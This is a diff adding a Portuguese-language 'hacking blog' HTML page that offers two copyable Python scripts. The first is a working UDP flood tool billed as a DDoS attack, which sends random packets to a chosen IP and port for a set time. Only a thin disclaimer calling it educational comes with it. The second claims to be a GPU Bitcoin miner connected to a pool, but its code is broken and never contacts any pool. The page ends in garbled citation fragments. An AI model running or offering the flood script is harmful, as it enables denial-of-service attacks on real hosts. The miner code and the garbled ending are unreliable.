@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Scripts - Storm Central</title>
+    <style>
+        /* Estilos gerais */
+        body {
+            background: linear-gradient(to right, #0f0c29, #302b63, #24243e);
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            cursor: url('https://cur.cursors-4u.net/user/use-4/use352.cur'), auto;
+            transition: background-color 0.5s ease-in-out;
+        }
+        body:hover {
+            background-color: #111111;
+        }
+
+        /* Header */
+        header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 2px solid #00ff00;
+            background: #1f1c3c;
+            color: #00ff00;
+        }
+        header h1 {
+            font-size: 3rem;
+            margin: 0;
+            text-shadow: 0 0 10px #66ff66;
+        }
+        header p {
+            font-size: 1.2rem;
+            color: #66ff66;
+        }
+
+        /* Menu de navegação */
+        nav {
+            background: #1b1a33;
+            border-bottom: 2px solid #00ff00;
+            padding: 10px 0;
+        }
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+        nav ul li {
+            margin: 0;
+        }
+        nav ul li a {
+            text-decoration: none;
+            color: #00ff00;
+            font-weight: bold;
+            padding: 10px 20px;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        nav ul li a:hover {
+            background: #66ff66;
+            color: #0f0c29;
+            text-shadow: 0 0 5px #0f0c29;
+            box-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+        }
+
+        /* Seção principal */
+        main {
+            padding: 20px;
+        }
+        .scripts {
+            background: rgba(15, 12, 41, 0.8);
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #00ff00;
+        }
+        .scripts h2 {
+            color: #66ff66;
+            text-shadow: 0 0 10px #66ff66;
+        }
+        .script-content {
+            background-color: #0b0b0b;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            position: relative;
+            box-shadow: 0 0 15px #00ff00;
+            margin-bottom: 20px;
+        }
+        .scripts textarea {
+            width: 100%;
+            height: 200px;
+            background-color: #0b0b0b;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 10px;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            resize: none;
+        }
+        .scripts button {
+            background: linear-gradient(135deg, #0b0b0b, #00ff00);
+            color: #0b0b0b;
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        .scripts button:hover {
+            background: linear-gradient(135deg, #00ff00, #66ff66);
+            color: #0b0b0b;
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .copy-button {
+            margin-top: 10px;
+            background: linear-gradient(135deg, #0b0b0b, #00ff00);
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            color: #0b0b0b;
+        }
+        .copy-button:hover {
+            background: linear-gradient(135deg, #00ff00, #66ff66);
+            color: #0b0b0b;
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Rodapé */
+        footer {
+            text-align: center;
+            padding: 10px;
+            background: #1f1c3c;
+            color: #00ff00;
+            border-top: 2px solid #00ff00;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Minhas Scripts</h1>
+        <p>Uma coleção das minhas criações de código e scripts úteis.</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="index.html">Home</a></li>
+            <li><a href="sobre.html">Sobre</a></li>
+            <li><a href="scripts.html">Scripts</a></li>
+            <li><a href="contato.html">Contato</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="scripts">
+            <h2>Minhas Scripts</h2>
+            <p>// Essa script faz um ataque DDoS básico, enviando pacotes para um IP e porta específicos pelo tempo determinado. Lembre-se de usar essa script somente para fins educativos e éticos. Usar ferramentas como essa para prejudicar outros é ilegal e contra os princípios de hacking ético que a gente valoriza! //</p>
+            <div class="script-content">
+                <textarea readonly id="script1">
+import socket
+import random
+import time
+import argparse
+
+# Função para gerar pacotes de dados aleatórios
+def generate_packet(size):
+    return random._urandom(size)
+
+def dos_attack(ip, port, size, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_to_send = generate_packet(size)
+    
+    timeout = time.time() + duration
+    sent = 0
+
+    while time.time() < timeout:
+        client.sendto(bytes_to_send, (ip, port))
+        sent += 1
+        print(f"Pacotes enviados: {sent} para {ip} na porta {port}")
+
+    print(f"Ataque finalizado. {sent} pacotes enviados.")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Script de DDoS em Python - STORM")
+    parser.add_argument("ip", type=str, help="Endereço IP de destino")
+    parser.add_argument("port", type=int, help="Porta de destino")
+    parser.add_argument("size", type=int, help="Tamanho dos pacotes")
+    parser.add_argument("duration", type=int, help="Duração do ataque (segundos)")
+
+    args = parser.parse_args()
+
+    dos_attack(args.ip, args.port, args.size, args.duration)
+                </textarea>
+                <center><button class="copy-button" onclick="copyScript('script2')">📋 Copiar Script</button></center>
+                <h3>🖥️ Descrição do Script de Ataque DDoS em Python 🖥️</h3>
+                <h3>🛠️ Recursos:</h3>
+<li><strong>Gerador de Pacotes Aleatórios: Cria pacotes de dados aleatórios para o ataque.</strong></li>
+
+<li><strong>Execução do Ataque DDoS: Envia os pacotes para o endereço IP e porta especificados.</strong></li>
+
+<li><strong>Controle de Duração: Define a duração do ataque em segundos.</strong></li>
+<li>Configuração por Linha de Comando: Permite definir IP, porta, tamanho dos pacotes e duração do ataque via argumentos da linha de comando.</li>
+<h3><strong>⚠️ Nota Importante:
+Use este script apenas para fins educativos e éticos. Atacar servidores sem permissão é ilegal e contra os princípios do hacking ético. 🚫</strong></h3>
+
+
+            </div>
+            <br>
+            <h1>___________________________________________________________________</h1>
+
+<br>
+        <p>// Este script em Python utiliza a biblioteca PyOpenCL para minerar Bitcoin (BTC) usando a GPU. Ele configura a conexão com uma pool de mineração 🎛️ e calcula hashes de dados aleatórios 📊, aproveitando o poder de processamento da GPU 🎮. Embora seja uma simulação simplificada, é ideal para fins educativos sobre mineração de criptomoedas 💻. //
+</p>
+            <div class="script-content">
+                <textarea readonly id="script2">import hashlib
+import numpy as np
+import pyopencl as cl
+import time
+
+# Configurações da pool de mineração e carteira
+POOL_URL = "stratum+tcp://pool_address:port"
+WALLET_ADDRESS = "your_bitcoin_wallet_address"
+
+# Configuração da plataforma e dispositivo OpenCL
+platform = cl.get_platforms()[0]
+device = platform.get_devices()[0]
+context = cl.Context([device])
+queue = cl.CommandQueue(context)
+
+# Kernel para mineração de BTC
+kernel_code = """
+__kernel void miner(__global const char* data, __global char* result) {
+    int id = get_global_id(0);
+    // Lógica simples de hashing (para fins educacionais)
+    char hash[64];
+    for (int i = 0; i < 64; ++i) {
+        hash[i] = data[i] ^ id;
+    }
+    // Armazenar o resultado
+    for (int i = 0; i < 64; ++i) {
+        result[i] = hash[i];
+    }
+}
+"""
+
+program = cl.Program(context, kernel_code).build()
+data = np.random.bytes(64).encode('utf-8')
+result = np.zeros(64, dtype=np.uint8)
+
+# Buffer
+data_buffer = cl.Buffer(context, cl.mem_flags.READ_ONLY | cl.mem_flags.COPY_HOST_PTR, hostbuf=data)
+result_buffer = cl.Buffer(context, cl.mem_flags.WRITE_ONLY, result.nbytes)
+
+# Tamanho do trabalho
+global_size = (64,)
+
+# Executar o kernel
+while True:
+    start_time = time.time()
+    cl.enqueue_copy(queue, data_buffer, data)
+    program.miner(queue, global_size, None, data_buffer, result_buffer)
+    cl.enqueue_copy(queue, result, result_buffer)
+    queue.finish()
+    end_time = time.time()
+    print(f"Hash calculado: {hashlib.sha256(result).hexdigest()} em {end_time - start_time} segundos")
+
+# Enviar hash para a pool (pseudo-código)
+# send_to_pool(result)
+</textarea>
+<center><button class="copy-button" onclick="copyScript('script2')">📋 Copiar Script</button></center>
+  <center><h3> 💻 Descrição do Script de Mineração de BTC 💻</h3></center>
+  <p><center>
+   
+<h3>🛠️ Recursos:</h3>
+<li><strong>Acesso à GPU para cálculos paralelos 🚀</strong></li>
+
+<li><strong>Conexão com uma pool de mineração 🌐</strong></li>
+
+<li><strong>Mineração de Bitcoin com hashes de dados aleatórios 🧩</strong></li>
+
+
+
+</center></p>
+<h3>⚠️ Nota:
+Mineração real de BTC com GPUs não é eficiente em comparação com ASICs dedicados.</h3>
+
+
+                
+
+            </div>
+            <h1>___________________________________________________________________</h1>
+       
+        </div>
+    </main>
+    <footer>
+        <p>© 2024 Hacking Blog | Powered by StormCentral</p>
+    </footer>
+    <script>
+        function copyScript(scriptId) {
+            var scriptText = document.getElementById(scriptId).value;
+            navigator.clipboard.writeText(scriptText).then(function() {
+                alert("Script copiada!");
+            }, function(err) {
+                alert("Erro ao copiar[_{{{CITATION{{{_1{](https://github.com/edsyang/blog/tree/2ce48a2788db8d4f4b5f5f5dc8c388799ea5c0c2/docs%2Fcourse%2Fvue%2F13-Vue.js-D.part%20four.md)[_{{{CITATION{{{_2{](https://github.com/waladahlmzaqi/portfoliopwpb/tree/1441b97ce3a2e804cd73879d3e0c6007e70fdd18/admin%2Findex.php)[_{{{CITATION{{{_3{](https://github.com/EWCMF/laravel-cloudstorage/tree/eb9f382563b4faaa619fb988fa37705013a8d38d/resources%2Fviews%2Flayouts%2Fapp.blade.php)
